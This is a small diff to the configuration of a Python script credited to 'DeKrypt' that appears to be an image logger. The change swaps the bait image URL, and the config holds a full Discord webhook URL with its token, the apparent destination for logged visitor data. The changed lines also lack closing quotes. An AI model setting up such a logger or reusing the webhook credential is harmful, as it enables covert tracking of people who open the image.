@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1388651030937600221/_nquhNzijJznYoBbjnG-j-zURoxybUJ-90ErtmN-B6ywPPoNg1wytYA28GGAFwONEWun",
-    "image": "https://www.filmpost.it/wp-content/uploads/2019/09/cars-movie-wallpaper-2560x1440jpg.jpeg, # You can also have a custom image by using a URL argument
+    "image": "https://www.mbusa.com/content/dam/mb-nafta/us/myco/my24/eqe-class/sedan/all-vehicles/2024-EQE350-4M-SEDAN-AVP-DR.png, # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
